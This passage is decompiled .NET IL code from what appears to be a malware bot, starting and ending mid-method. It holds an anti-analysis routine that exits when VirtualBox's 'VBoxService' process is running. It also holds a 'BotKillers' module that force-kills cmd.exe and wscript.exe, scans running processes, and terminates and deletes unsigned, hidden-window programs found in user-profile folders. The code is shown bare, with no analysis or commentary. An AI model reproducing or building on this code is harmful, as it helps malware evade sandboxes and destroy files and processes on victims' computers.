    IL_02a6:  pop
    IL_02a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02ac:  ldloc.s    V_33
    IL_02ae:  ldc.i4.1
    IL_02af:  add.ovf
    IL_02b0:  stloc.s    V_33
    IL_02b2:  ldloc.s    V_33
    IL_02b4:  ldloc.s    V_32
    IL_02b6:  ldlen
    IL_02b7:  conv.i4
    IL_02b8:  blt.s      IL_02a1

    IL_02ba:  ldstr      "VBoxService"
    IL_02bf:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02c4:  stloc.s    V_34
    IL_02c6:  ldc.i4.0
    IL_02c7:  stloc.s    V_35
    IL_02c9:  br.s       IL_02dc

    IL_02cb:  ldloc.s    V_34
    IL_02cd:  ldloc.s    V_35
    IL_02cf:  ldelem.ref
    IL_02d0:  pop
    IL_02d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02d6:  ldloc.s    V_35
    IL_02d8:  ldc.i4.1
    IL_02d9:  add.ovf
    IL_02da:  stloc.s    V_35
    IL_02dc:  ldloc.s    V_35
    IL_02de:  ldloc.s    V_34
    IL_02e0:  ldlen
    IL_02e1:  conv.i4
    IL_02e2:  blt.s      IL_02cb

    IL_02e4:  ret
  } // end of method MyAntiProcess::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     5.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void MyAntiProcess::Handler(object,
                                                     class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method MyAntiProcess::Start

} // end of class MyAntiProcess

.class private auto ansi sealed beforefieldinit BotKillers
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested public ThreadAccess
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype BotKillers/ThreadAccess DIRECT_IMPERSONATION = int32(0x00000200)
    .field public static literal valuetype BotKillers/ThreadAccess GET_CONTEXT = int32(0x00000008)
    .field public static literal valuetype BotKillers/ThreadAccess IMPERSONATE = int32(0x00000100)
    .field public static literal valuetype BotKillers/ThreadAccess QUERY_INFORMATION = int32(0x00000040)
    .field public static literal valuetype BotKillers/ThreadAccess SET_CONTEXT = int32(0x00000010)
    .field public static literal valuetype BotKillers/ThreadAccess SET_INFORMATION = int32(0x00000020)
    .field public static literal valuetype BotKillers/ThreadAccess SET_THREAD_TOKEN = int32(0x00000080)
    .field public static literal valuetype BotKillers/ThreadAccess SUSPEND_RESUME = int32(0x00000002)
    .field public static literal valuetype BotKillers/ThreadAccess TERMINATE = int32(0x00000001)
  } // end of class ThreadAccess

  .class auto ansi sealed nested public WinTrustDataUIChoice
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice All = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice None = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice NoBad = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice NoGood = uint32(0x00000004)
  } // end of class WinTrustDataUIChoice

  .class auto ansi sealed nested public WinTrustDataRevocationChecks
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataRevocationChecks None = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataRevocationChecks WholeChain = uint32(0x00000001)
  } // end of class WinTrustDataRevocationChecks

  .class auto ansi sealed nested public WinTrustDataChoice
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataChoice File = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Catalog = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Blob = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Signer = uint32(0x00000004)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Certificate = uint32(0x00000005)
  } // end of class WinTrustDataChoice

  .class auto ansi sealed nested public WinTrustDataStateAction
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Ignore = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Verify = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Close = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction AutoCache = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction AutoCacheFlush = uint32(0x00000004)
  } // end of class WinTrustDataStateAction

  .class auto ansi sealed nested public WinTrustDataProvFlags
         extends [mscorlib]System.Enum
  {
    .custom instance void [mscorlib]System.FlagsAttribute::.ctor() = ( 01 00 00 00 ) 
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags UseIe4TrustFlag = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags NoIe4ChainFlag = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags NoPolicyUsageFlag = uint32(0x00000004)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckNone = uint32(0x00000010)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckEndCert = uint32(0x00000020)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckChain = uint32(0x00000040)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckChainExcludeRoot = uint32(0x00000080)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags SaferFlag = uint32(0x00000100)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags HashOnlyFlag = uint32(0x00000200)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags UseDefaultOsverCheck = uint32(0x00000400)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags LifetimeSigningFlag = uint32(0x00000800)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags CacheOnlyUrlRetrieval = uint32(0x00001000)
  } // end of class WinTrustDataProvFlags

  .class auto ansi sealed nested public WinTrustDataUIContext
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataUIContext Execute = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataUIContext Install = uint32(0x00000001)
  } // end of class WinTrustDataUIContext

  .class sequential unicode nested public WinTrustFileInfo
         extends [mscorlib]System.Object
  {
    .field private int32 StructSize
    .field private native int pszFilePath
    .field private native int hFile
    .field private native int pgKnownSubject
    .method public specialname rtspecialname 
            instance void  .ctor(string _filePath) cil managed
    {
      // Code size       62 (0x3e)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.0
      IL_0007:  ldtoken    BotKillers/WinTrustFileInfo
      IL_000c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0011:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0016:  stfld      int32 BotKillers/WinTrustFileInfo::StructSize
      IL_001b:  ldarg.0
      IL_001c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0021:  stfld      native int BotKillers/WinTrustFileInfo::hFile
      IL_0026:  ldarg.0
      IL_0027:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_002c:  stfld      native int BotKillers/WinTrustFileInfo::pgKnownSubject
      IL_0031:  ldarg.0
      IL_0032:  ldarg.1
      IL_0033:  call       native int [mscorlib]System.Runtime.InteropServices.Marshal::StringToCoTaskMemAuto(string)
      IL_0038:  stfld      native int BotKillers/WinTrustFileInfo::pszFilePath
      IL_003d:  ret
    } // end of method WinTrustFileInfo::.ctor

    .method family hidebysig strict virtual 
            instance void  Finalize() cil managed
    {
      // Code size       21 (0x15)
      .maxstack  1
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  ldfld      native int BotKillers/WinTrustFileInfo::pszFilePath
        IL_0006:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::FreeCoTaskMem(native int)
        IL_000b:  leave.s    IL_0014

      }  // end .try
      finally
      {
        IL_000d:  ldarg.0
        IL_000e:  call       instance void [mscorlib]System.Object::Finalize()
        IL_0013:  endfinally
      }  // end handler
      IL_0014:  ret
    } // end of method WinTrustFileInfo::Finalize

  } // end of class WinTrustFileInfo

  .class sequential unicode nested public WinTrustData
         extends [mscorlib]System.Object
  {
    .field private int32 StructSize
    .field private native int PolicyCallbackData
    .field private native int SIPClientData
    .field private valuetype BotKillers/WinTrustDataUIChoice UIChoice
    .field private valuetype BotKillers/WinTrustDataRevocationChecks RevocationChecks
    .field private valuetype BotKillers/WinTrustDataChoice UnionChoice
    .field private native int FileInfoPtr
    .field private valuetype BotKillers/WinTrustDataStateAction StateAction
    .field private native int StateData
    .field private string URLReference
    .field private valuetype BotKillers/WinTrustDataProvFlags ProvFlags
    .field private valuetype BotKillers/WinTrustDataUIContext UIContext
    .method public specialname rtspecialname 
            instance void  .ctor(string _fileName) cil managed
    {
      // Code size       158 (0x9e)
      .maxstack  3
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.0
      IL_0007:  ldtoken    BotKillers/WinTrustData
      IL_000c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0011:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0016:  stfld      int32 BotKillers/WinTrustData::StructSize
      IL_001b:  ldarg.0
      IL_001c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0021:  stfld      native int BotKillers/WinTrustData::PolicyCallbackData
      IL_0026:  ldarg.0
      IL_0027:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_002c:  stfld      native int BotKillers/WinTrustData::SIPClientData
      IL_0031:  ldarg.0
      IL_0032:  ldc.i4.2
      IL_0033:  stfld      valuetype BotKillers/WinTrustDataUIChoice BotKillers/WinTrustData::UIChoice
      IL_0038:  ldarg.0
      IL_0039:  ldc.i4.0
      IL_003a:  stfld      valuetype BotKillers/WinTrustDataRevocationChecks BotKillers/WinTrustData::RevocationChecks
      IL_003f:  ldarg.0
      IL_0040:  ldc.i4.1
      IL_0041:  stfld      valuetype BotKillers/WinTrustDataChoice BotKillers/WinTrustData::UnionChoice
      IL_0046:  ldarg.0
      IL_0047:  ldc.i4.0
      IL_0048:  stfld      valuetype BotKillers/WinTrustDataStateAction BotKillers/WinTrustData::StateAction
      IL_004d:  ldarg.0
      IL_004e:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0053:  stfld      native int BotKillers/WinTrustData::StateData
      IL_0058:  ldarg.0
      IL_0059:  ldnull
      IL_005a:  stfld      string BotKillers/WinTrustData::URLReference
      IL_005f:  ldarg.0
      IL_0060:  ldc.i4     0x100
      IL_0065:  stfld      valuetype BotKillers/WinTrustDataProvFlags BotKillers/WinTrustData::ProvFlags
      IL_006a:  ldarg.0
      IL_006b:  ldc.i4.0
      IL_006c:  stfld      valuetype BotKillers/WinTrustDataUIContext BotKillers/WinTrustData::UIContext
      IL_0071:  ldarg.1
      IL_0072:  newobj     instance void BotKillers/WinTrustFileInfo::.ctor(string)
      IL_0077:  ldarg.0
      IL_0078:  ldtoken    BotKillers/WinTrustFileInfo
      IL_007d:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0082:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0087:  call       native int [mscorlib]System.Runtime.InteropServices.Marshal::AllocCoTaskMem(int32)
      IL_008c:  stfld      native int BotKillers/WinTrustData::FileInfoPtr
      IL_0091:  ldarg.0
      IL_0092:  ldfld      native int BotKillers/WinTrustData::FileInfoPtr
      IL_0097:  ldc.i4.0
      IL_0098:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::StructureToPtr(object,
                                                                                                 native int,
                                                                                                 bool)
      IL_009d:  ret
    } // end of method WinTrustData::.ctor

    .method family hidebysig strict virtual 
            instance void  Finalize() cil managed
    {
      // Code size       21 (0x15)
      .maxstack  1
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  ldfld      native int BotKillers/WinTrustData::FileInfoPtr
        IL_0006:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::FreeCoTaskMem(native int)
        IL_000b:  leave.s    IL_0014

      }  // end .try
      finally
      {
        IL_000d:  ldarg.0
        IL_000e:  call       instance void [mscorlib]System.Object::Finalize()
        IL_0013:  endfinally
      }  // end handler
      IL_0014:  ret
    } // end of method WinTrustData::Finalize

  } // end of class WinTrustData

  .class auto ansi sealed nested public WinVerifyTrustResult
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype BotKillers/WinVerifyTrustResult Success = int32(0x00000000)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult ProviderUnknown = int32(0x800B0001)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult ActionUnknown = int32(0x800B0002)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult SubjectFormUnknown = int32(0x800B0003)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult SubjectNotTrusted = int32(0x800B0004)
  } // end of class WinVerifyTrustResult

  .class auto ansi sealed nested public beforefieldinit WinTrust
         extends [mscorlib]System.Object
  {
    .field private static initonly native int INVALID_HANDLE_VALUE
    .field private static literal string WINTRUST_ACTION_GENERIC_VERIFY_V2 = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
    .method private specialname rtspecialname static 
            void  .cctor() cil managed
    {
      // Code size       12 (0xc)
      .maxstack  8
      IL_0000:  ldc.i4.m1
      IL_0001:  newobj     instance void [mscorlib]System.IntPtr::.ctor(int32)
      IL_0006:  stsfld     native int BotKillers/WinTrust::INVALID_HANDLE_VALUE
      IL_000b:  ret
    } // end of method WinTrust::.cctor

    .method private static pinvokeimpl("wintrust.dll" nomangle unicode winapi) 
            valuetype BotKillers/WinVerifyTrustResult 
            WinVerifyTrust([in] native int hwnd,
                           [in] valuetype [mscorlib]System.Guid  marshal( lpstruct) pgActionID,
                           [in] class BotKillers/WinTrustData pWVTData) cil managed preservesig
    {
    }
    .method public static bool  VerifyEmbeddedSignature(string fileName) cil managed
    {
      // Code size       52 (0x34)
      .maxstack  3
      .locals init (bool V_0,
               class BotKillers/WinTrustData V_1,
               valuetype [mscorlib]System.Guid V_2)
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  newobj     instance void BotKillers/WinTrustData::.ctor(string)
        IL_0006:  stloc.1
        IL_0007:  ldstr      "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
        IL_000c:  newobj     instance void [mscorlib]System.Guid::.ctor(string)
        IL_0011:  stloc.2
        IL_0012:  ldsfld     native int BotKillers/WinTrust::INVALID_HANDLE_VALUE
        IL_0017:  ldloc.2
        IL_0018:  ldloc.1
        IL_0019:  call       valuetype BotKillers/WinVerifyTrustResult BotKillers/WinTrust::WinVerifyTrust(native int,
                                                                                                           valuetype [mscorlib]System.Guid,
                                                                                                           class BotKillers/WinTrustData)
        IL_001e:  ldc.i4.0
        IL_001f:  ceq
        IL_0021:  stloc.0
        IL_0022:  leave.s    IL_0032

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0029:  ldc.i4.0
        IL_002a:  stloc.0
        IL_002b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0030:  leave.s    IL_0032

      }  // end handler
      IL_0032:  ldloc.0
      IL_0033:  ret
    } // end of method WinTrust::VerifyEmbeddedSignature

    .method private specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method WinTrust::.ctor

  } // end of class WinTrust

  .field private static int32 ProccessKilled
  .field private static int32 Startupkilled
  .field private static string hio
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     int32 BotKillers::ProccessKilled
    IL_0006:  ldc.i4.0
    IL_0007:  stsfld     int32 BotKillers::Startupkilled
    IL_000c:  ret
  } // end of method BotKillers::.cctor

  .method private static pinvokeimpl("user32.dll" lasterr winapi) 
          bool  marshal( bool)  IsWindowVisible(native int hWnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method public static void  RunStandardBotKiller() cil managed
  {
    // Code size       189 (0xbd)
    .maxstack  4
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldstr      "TASKKILL /F /IM wscript.exe"
      IL_000e:  ldc.i4.0
      IL_000f:  ldc.i4.0
      IL_0010:  ldc.i4.m1
      IL_0011:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0016:  pop
      IL_0017:  ldc.i4.3
      IL_0018:  stloc.2
      IL_0019:  ldstr      "TASKKILL /F /IM cmd.exe"
      IL_001e:  ldc.i4.0
      IL_001f:  ldc.i4.0
      IL_0020:  ldc.i4.m1
      IL_0021:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0026:  pop
      IL_0027:  ldc.i4.4
      IL_0028:  stloc.2
      IL_0029:  call       void BotKillers::ScanProcess()
      IL_002e:  ldc.i4.5
      IL_002f:  stloc.2
      IL_0030:  call       void BotKillers::RunStartupKiller()
      IL_0035:  ldc.i4.6
      IL_0036:  stloc.2
      IL_0037:  ldc.i4.0
      IL_0038:  stsfld     int32 BotKillers::ProccessKilled
      IL_003d:  ldc.i4.7
      IL_003e:  stloc.2
      IL_003f:  ldc.i4.0
      IL_0040:  stsfld     int32 BotKillers::Startupkilled
      IL_0045:  leave.s    IL_00b4

      IL_0047:  ldloc.1
      IL_0048:  ldc.i4.1
      IL_0049:  add
      IL_004a:  ldc.i4.0
      IL_004b:  stloc.1
      IL_004c:  switch     ( 
                            IL_0075,
                            IL_0000,
                            IL_0007,
                            IL_0017,
                            IL_0027,
                            IL_002e,
                            IL_0035,
                            IL_003d,
                            IL_0045)
      IL_0075:  leave.s    IL_00a9

      IL_0077:  ldloc.2
      IL_0078:  stloc.1
      IL_0079:  ldloc.0
      IL_007a:  switch     ( 
                            IL_0087,
                            IL_0047)
      IL_0087:  leave.s    IL_00a9

    }  // end .try
    filter
    {
      IL_0089:  isinst     [mscorlib]System.Exception
      IL_008e:  ldnull
      IL_008f:  cgt.un
      IL_0091:  ldloc.0
      IL_0092:  ldc.i4.0
      IL_0093:  cgt.un
      IL_0095:  and
      IL_0096:  ldloc.1
      IL_0097:  ldc.i4.0
      IL_0098:  ceq
      IL_009a:  and
      IL_009b:  endfilter
    }  // end filter
    {  // handler
      IL_009d:  castclass  [mscorlib]System.Exception
      IL_00a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a7:  leave.s    IL_0077

    }  // end handler
    IL_00a9:  ldc.i4     0x800a0033
    IL_00ae:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_00b3:  throw

    IL_00b4:  ldloc.1
    IL_00b5:  brfalse.s  IL_00bc

    IL_00b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_00bc:  ret
  } // end of method BotKillers::RunStandardBotKiller

  .method public static void  ScanProcess() cil managed
  {
    // Code size       128 (0x80)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             string V_1,
             int32 V_2,
             int32 V_3,
             class [System]System.Diagnostics.Process V_4)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
      IL_0005:  stloc.0
      IL_0006:  ldloc.0
      IL_0007:  ldlen
      IL_0008:  conv.i4
      IL_0009:  ldc.i4.1
      IL_000a:  sub.ovf
      IL_000b:  stloc.2
      IL_000c:  ldc.i4.0
      IL_000d:  stloc.3
      IL_000e:  br.s       IL_006d

      IL_0010:  ldloc.0
      IL_0011:  ldloc.3
      IL_0012:  ldelem.ref
      IL_0013:  stloc.s    V_4
      .try
      {
        IL_0015:  ldloc.s    V_4
        IL_0017:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
        IL_001c:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
        IL_0021:  call       string [mscorlib]System.IO.Path::GetFullPath(string)
        IL_0026:  stloc.1
        IL_0027:  ldloc.1
        IL_0028:  call       bool BotKillers::IsFileMalicious(string)
        IL_002d:  brfalse.s  IL_005b

        IL_002f:  ldloc.s    V_4
        IL_0031:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
        IL_0036:  call       bool BotKillers::WindowIsVisible(string)
        IL_003b:  brtrue.s   IL_005b

        IL_003d:  ldloc.s    V_4
        IL_003f:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
        IL_0044:  call       void BotKillers::TerminateProcess(int32)
        IL_0049:  ldloc.1
        IL_004a:  call       void BotKillers::DestroyFile(string)
        IL_004f:  ldsfld     int32 BotKillers::ProccessKilled
        IL_0054:  ldc.i4.1
        IL_0055:  add.ovf
        IL_0056:  stsfld     int32 BotKillers::ProccessKilled
        IL_005b:  leave.s    IL_0069

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_005d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0062:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0067:  leave.s    IL_0069

      }  // end handler
      IL_0069:  ldloc.3
      IL_006a:  ldc.i4.1
      IL_006b:  add.ovf
      IL_006c:  stloc.3
      IL_006d:  ldloc.3
      IL_006e:  ldloc.2
      IL_006f:  ble.s      IL_0010

      IL_0071:  leave.s    IL_007f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0073:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0078:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007d:  leave.s    IL_007f

    }  // end handler
    IL_007f:  ret
  } // end of method BotKillers::ScanProcess

  .method public static bool  IsFileMalicious(string fileloc) cil managed
  {
    // Code size       489 (0x1e9)
    .maxstack  3
    .locals init (bool V_0,
             int32 V_1,
             int32 V_2,
             int32 V_3,
             valuetype [mscorlib]System.IO.FileAttributes V_4)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.1
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.3
      IL_0009:  ldarg.0
      IL_000a:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_000f:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0014:  brfalse.s  IL_001f

      IL_0016:  ldc.i4.3
      IL_0017:  stloc.3
      IL_0018:  ldc.i4.0
      IL_0019:  stloc.0
      IL_001a:  br         IL_0125

      IL_001f:  ldc.i4.4
      IL_0020:  stloc.3
      IL_0021:  ldarg.0
      IL_0022:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0027:  ldstr      "malware"
      IL_002c:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0031:  brfalse.s  IL_003b

      IL_0033:  ldc.i4.5
      IL_0034:  stloc.3
      IL_0035:  ldarg.0
      IL_0036:  call       void BotKillers::DestroyFile(string)
      IL_003b:  ldc.i4.6
      IL_003c:  stloc.3
      IL_003d:  ldarg.0
      IL_003e:  ldstr      "Google.com"
      IL_0043:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0048:  brfalse.s  IL_0053

      IL_004a:  ldc.i4.7
      IL_004b:  stloc.3
      IL_004c:  ldc.i4.0
      IL_004d:  stloc.0
      IL_004e:  br         IL_0125

      IL_0053:  ldc.i4.8
      IL_0054:  stloc.3
      IL_0055:  ldarg.0
      IL_0056:  ldstr      "Microsoft.com"
      IL_005b:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0060:  brfalse.s  IL_006c

      IL_0062:  ldc.i4.s   9
      IL_0064:  stloc.3
      IL_0065:  ldc.i4.0
      IL_0066:  stloc.0
      IL_0067:  br         IL_0125

      IL_006c:  ldc.i4.s   10
      IL_006e:  stloc.3
      IL_006f:  ldarg.0
      IL_0070:  ldstr      "cmd"
      IL_0075:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_007a:  brfalse.s  IL_0086

      IL_007c:  ldc.i4.s   11
      IL_007e:  stloc.3
      IL_007f:  ldc.i4.1
      IL_0080:  stloc.0
      IL_0081:  br         IL_0125

      IL_0086:  ldc.i4.s   12
      IL_0088:  stloc.3
      IL_0089:  ldarg.0
      IL_008a:  ldstr      "wscript"
      IL_008f:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0094:  brfalse.s  IL_00a0

      IL_0096:  ldc.i4.s   13
      IL_0098:  stloc.3
      IL_0099:  ldc.i4.1
      IL_009a:  stloc.0
      IL_009b:  br         IL_0125

      IL_00a0:  ldc.i4.s   14
      IL_00a2:  stloc.3
      IL_00a3:  ldarg.0
      IL_00a4:  call       string [mscorlib]System.Runtime.InteropServices.RuntimeEnvironment::GetRuntimeDirectory()
      IL_00a9:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00ae:  brfalse.s  IL_00b7

      IL_00b0:  ldc.i4.s   15
      IL_00b2:  stloc.3
      IL_00b3:  ldc.i4.1
      IL_00b4:  stloc.0
      IL_00b5:  br.s       IL_0125

      IL_00b7:  ldc.i4.s   16
      IL_00b9:  stloc.3
      IL_00ba:  ldarg.0
      IL_00bb:  call       bool BotKillers/WinTrust::VerifyEmbeddedSignature(string)
      IL_00c0:  brfalse.s  IL_00c9

      IL_00c2:  ldc.i4.s   17
      IL_00c4:  stloc.3
      IL_00c5:  ldc.i4.0
      IL_00c6:  stloc.0
      IL_00c7:  br.s       IL_0125

      IL_00c9:  ldc.i4.s   18
      IL_00cb:  stloc.3
      IL_00cc:  ldarg.0
      IL_00cd:  ldstr      "USERPROFILE"
      IL_00d2:  call       string [mscorlib]System.Environment::GetEnvironmentVariable(string)
      IL_00d7:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00dc:  ldarg.0
      IL_00dd:  ldc.i4.s   35
      IL_00df:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_00e4:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00e9:  or
      IL_00ea:  brfalse.s  IL_00f3

      IL_00ec:  ldc.i4.s   19
      IL_00ee:  stloc.3
      IL_00ef:  ldc.i4.1
      IL_00f0:  stloc.0
      IL_00f1:  br.s       IL_0125

      IL_00f3:  ldc.i4.s   20
      IL_00f5:  stloc.3
      IL_00f6:  ldarg.0
      IL_00f7:  call       valuetype [mscorlib]System.IO.FileAttributes [mscorlib]System.IO.File::GetAttributes(string)
      IL_00fc:  stloc.s    V_4
      IL_00fe:  ldc.i4.s   21
      IL_0100:  stloc.3
